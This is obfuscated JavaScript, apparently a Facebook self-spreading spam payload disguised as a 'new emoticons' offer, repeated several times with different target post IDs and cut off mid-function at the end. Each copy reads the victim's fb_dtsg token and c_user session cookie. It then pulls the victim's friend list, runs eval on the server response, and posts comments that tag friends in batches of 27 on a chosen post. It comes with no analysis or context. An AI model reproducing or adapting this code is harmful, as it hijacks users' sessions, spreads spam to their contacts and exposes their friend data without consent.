user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","690556874337720","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","454755387989346","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","454755387989346","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","425761117567697","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","453855244746027","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var 